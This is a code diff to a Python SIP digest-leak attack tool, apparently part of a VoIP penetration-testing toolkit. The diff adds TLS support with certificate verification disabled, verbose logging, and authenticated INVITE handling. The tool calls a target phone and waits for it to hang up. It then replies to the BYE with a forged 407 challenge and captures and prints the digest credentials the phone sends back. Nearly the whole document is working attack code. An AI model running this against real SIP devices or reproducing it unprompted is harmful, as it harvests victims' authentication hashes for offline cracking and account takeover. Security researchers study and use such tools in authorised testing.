@@ -9,9 +9,11 @@ __email__ = "pepeluxx@gmail.com"
 
 import socket
 import sys
+import ssl
 import ipaddress
 import re
-from lib.functions import create_message, create_response_error, create_response_ok, parse_message, parse_digest, generate_random_string, get_machine_default_ip, ip2long, get_free_port
+from tabnanny import verbose
+from lib.functions import create_message, create_response_error, create_response_ok, parse_message, parse_digest, generate_random_string, get_machine_default_ip, ip2long, get_free_port, calculateHash
 
 BRED = '\033[1;31;40m'
 RED = '\033[0;31;40m'
@@ -48,9 +50,12 @@ class SipDigestLeak:
         self.to_domain = ''
         self.user_agent = 'pplsip'
         self.ofile = ''
+        self.user = ''
+        self.pwd = ''
+        self.verbose = 0
 
     def start(self):
-        supported_protos = ['UDP', 'TCP']
+        supported_protos = ['UDP', 'TCP', 'TLS']
 
         self.proto = self.proto.upper()
 
@@ -58,6 +63,10 @@ class SipDigestLeak:
         if self.proto not in supported_protos:
             print(BRED + 'Protocol %s is not supported' % self.proto)
             sys.exit()
+
+        # if rport is by default but we want to scan TLS protocol, use port 5061
+        if self.rport == 5060 and self.proto == 'TLS':
+            self.rport = 5061
 
         print(BWHITE + '[!] Target: ' + GREEN + '%s:%s/%s' %
               (self.ip, self.rport, self.proto))
@@ -68,7 +77,7 @@ class SipDigestLeak:
         self.call(self.ip, self.rport, self.proto)
 
     def call(self, ip, port, proto):
-        method = 'INVITE'
+        cseq = '1'
 
         # my IP address
         local_ip = get_machine_default_ip()
@@ -107,10 +116,15 @@ class SipDigestLeak:
         callid = generate_random_string(32, 1)
         tag = generate_random_string(8, 1)
 
-        msg = create_message(method, self.contact_domain, self.from_user, self.from_name, self.from_domain, 
-                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, '1', '', '', 1, '', 0)
+        msg = create_message('INVITE', self.contact_domain, self.from_user, self.from_name, self.from_domain,
+                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', '', 1, '', 0, '', '')
 
-        print(YELLOW + '[=>] Request %s' % method + WHITE)
+        print(YELLOW + '[=>] Request INVITE' + WHITE)
+
+        if self.verbose == 1:
+            print(BWHITE + '[+] Sending to %s:%s/%s ...' %
+                  (self.ip, self.rport, self.proto))
+            print(YELLOW + msg + WHITE)
 
         try:
             sock.settimeout(15)
@@ -119,17 +133,29 @@ class SipDigestLeak:
             if proto == 'TCP':
                 sock.connect(host)
 
-            sock.sendto(bytes(msg[:8192], 'utf-8'), host)
+            if self.proto == 'TLS':
+                sock_ssl = ssl.wrap_socket(
+                    sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
+                sock_ssl.connect(host)
+                sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
+            else:
+                sock.sendto(bytes(msg[:8192], 'utf-8'), host)
 
             rescode = '100'
 
             while rescode[:1] == '1':
                 # receive temporary code
-                resp = sock.recv(4096)
+                if self.proto == 'TLS':
+                    resp = sock_ssl.recv(4096)
+                else:
+                    resp = sock.recv(4096)
 
                 headers = parse_message(resp.decode())
 
                 if headers:
+                    via = headers['via']
+                    rr = headers['rr']
+
                     response = '%s %s' % (
                         headers['response_code'], headers['response_text'])
                     rescode = headers['response_code']
@@ -137,50 +163,193 @@ class SipDigestLeak:
 
                     totag = headers['totag']
 
+                if self.verbose == 1:
+                    print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
+                          (self.ip, self.rport, self.proto))
+                    print(GREEN + resp.decode() + WHITE)
+
+            if self.user != '' and self.pwd != '' and (headers['response_code'] == '401' or headers['response_code'] == '407'):
+                # send ACK
+                print(YELLOW + '[+] Request ACK')
+                msg = create_message('ACK', self.contact_domain, self.from_user, self.from_name, self.from_domain,
+                                     self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, totag, '', 1, '', 0, via, rr)
+
+                if self.verbose == 1:
+                    print(BWHITE + '[+] Sending to %s:%s/%s ...' %
+                          (self.ip, self.rport, self.proto))
+                    print(YELLOW + msg + WHITE)
+
+                if self.proto == 'TLS':
+                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
+                else:
+                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)
+
+                # auth_type == 1
+
+                if headers['auth'] != '':
+                    auth = headers['auth']
+                    auth_type = headers['auth-type']
+                    headers = parse_digest(auth)
+                    realm = headers['realm']
+                    nonce = headers['nonce']
+                    uri = 'sip:%s@%s' % (self.to_user, self.domain)
+                    algorithm = headers['algorithm']
+                    cnonce = headers['cnonce']
+                    nc = headers['nc']
+                    qop = headers['qop']
+
+                    if qop != '' and cnonce == '':
+                        cnonce = generate_random_string(8, 0)
+                    if qop != '' and nc == '':
+                        nc = '00000001'
+
+                    response = calculateHash(
+                        self.user, realm, self.pwd, 'INVITE', uri, nonce, algorithm, cnonce, nc, qop, 0, '')
+
+                    digest = 'Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s", algorithm=%s' % (
+                        self.user, realm, nonce, uri, response, algorithm)
+                    if qop != '':
+                        digest += ', qop=%s' % qop
+                    if cnonce != '':
+                        digest += ', cnonce="%s"' % cnonce
+                    if nc != '':
+                        digest += ', nc=%s' % nc
+
+                    branch = generate_random_string(71, 0)
+                    cseq = str(int(cseq) + 1)
+
+                    print(YELLOW + '[=>] Request INVITE' + WHITE)
+
+                    msg = create_message('INVITE', self.contact_domain, self.from_user, self.from_name, self.from_domain, self.to_user, self.to_name, self.to_domain, self.proto,
+                                         self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', digest, auth_type, '', 0, via, '')
+
+                    if self.verbose == 1:
+                        print(BWHITE + '[+] Sending to %s:%s/%s ...' %
+                              (self.ip, self.rport, self.proto))
+                        print(YELLOW + msg + WHITE)
+
+                    try:
+                        if self.proto == 'TLS':
+                            sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
+                        else:
+                            sock.sendto(bytes(msg[:8192], 'utf-8'), host)
+
+                        rescode = '100'
+
+                        while rescode[:1] == '1':
+                            # receive temporary code
+                            if self.proto == 'TLS':
+                                resp = sock_ssl.recv(4096)
+                            else:
+                                resp = sock.recv(4096)
+
+                            headers = parse_message(resp.decode())
+
+                            if headers:
+                                rr = headers['rr']
+
+                                response = '%s %s' % (
+                                    headers['response_code'], headers['response_text'])
+                                rescode = headers['response_code']
+
+                                print(CYAN + '[<=] Response %s' % response)
+                                if self.verbose == 1:
+                                    print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
+                                          (self.ip, self.rport, self.proto))
+                                    print(GREEN + resp.decode() + WHITE)
+                    except:
+                        print(WHITE)
+
             # receive 200 Ok - call answered
             if headers['response_code'] == '200':
+                cdomain = headers['contactdomain']
+                if cdomain == '':
+                    cdomain = self.domain
+
                 # send ACK
                 print(YELLOW + '[=>] Request ACK')
-                msg = create_message('ACK', self.contact_domain, self.from_user, self.from_name, self.from_domain,
-                                     self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, '1', totag, '', 1, '', 0)
 
-                sock.sendto(bytes(msg[:8192], 'utf-8'), host)
+                msg = create_message('ACK', self.contact_domain, self.from_user, self.from_name, self.from_domain,
+                                     self.to_user, self.to_name, self.to_domain, proto, cdomain, self.user_agent, lport, branch, callid, tag, cseq, totag, '', 1, '', 0, via, rr)
+
+                if self.verbose == 1:
+                    print(BWHITE + '[+] Sending to %s:%s/%s ...' %
+                          (self.ip, self.rport, self.proto))
+                    print(YELLOW + msg + WHITE)
+
+                if self.proto == 'TLS':
+                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
+                else:
+                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)
 
                 # wait for BYE
                 bye = False
                 while bye == False:
                     print(WHITE + '\t... waiting for BYE ...')
 
-                    resp = sock.recv(4096)
+                    if self.proto == 'TLS':
+                        resp = sock_ssl.recv(4096)
+                    else:
+                        resp = sock.recv(4096)
+
                     if resp.decode()[0:3] == 'BYE':
                         bye = True
                         print(CYAN + '[<=] Received BYE')
                         headers = parse_message(resp.decode())
                         branch = headers['branch']
+                    else:
+                        print(CYAN + '[<=] Response %s' % response)
+
+                    if self.verbose == 1:
+                        print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
+                              (self.ip, self.rport, self.proto))
+                        print(GREEN + resp.decode() + WHITE)
 
                 # send 407 with digest
+                cseq = int(cseq) + 1
                 msg = create_response_error('407 Proxy Authentication Required', self.from_user,
-                                            self.to_user, proto, self.domain, lport, 2, 'BYE', branch, callid, tag, totag, local_ip)
+                                            self.to_user, proto, self.domain, lport, cseq, 'BYE', branch, callid, tag, totag, local_ip)
 
                 print(
                     YELLOW + '[=>] Request 407 Proxy Authentication Required')
-                sock.sendto(bytes(msg[:8192], 'utf-8'), host)
+
+                if self.proto == 'TLS':
+                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
+                else:
+                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)
 
                 # receive auth BYE
-                resp = sock.recv(4096)
+                if self.proto == 'TLS':
+                    resp = sock_ssl.recv(4096)
+                else:
+                    resp = sock.recv(4096)
+
                 print(CYAN + '[<=] Received BYE with digest')
+
+                if self.verbose == 1:
+                    print(BWHITE + '[+] Receiving from %s:%s/%s ...' %
+                          (self.ip, self.rport, self.proto))
+                    print(GREEN + resp.decode() + WHITE)
 
                 headers = parse_message(resp.decode())
                 branch = headers['branch']
                 auth = headers['auth']
 
                 # send 200 OK
-                cseq = headers['cseq']
                 msg = create_response_ok(
-                    self.from_user, self.to_user, proto, self.domain, lport, int(cseq), branch, callid, tag, totag,)
+                    self.from_user, self.to_user, proto, self.domain, lport, cseq, branch, callid, tag, totag,)
 
                 print(YELLOW + '[=>] Request 200 Ok\n')
-                sock.sendto(bytes(msg[:8192], 'utf-8'), host)
+
+                if self.verbose == 1:
+                    print(BWHITE + '[+] Sending to %s:%s/%s ...' %
+                          (self.ip, self.rport, self.proto))
+                    print(YELLOW + msg + WHITE)
+
+                if self.proto == 'TLS':
+                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
+                else:
+                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)
 
                 print(BGREEN + 'Auth=%s\n' % auth + WHITE)
 
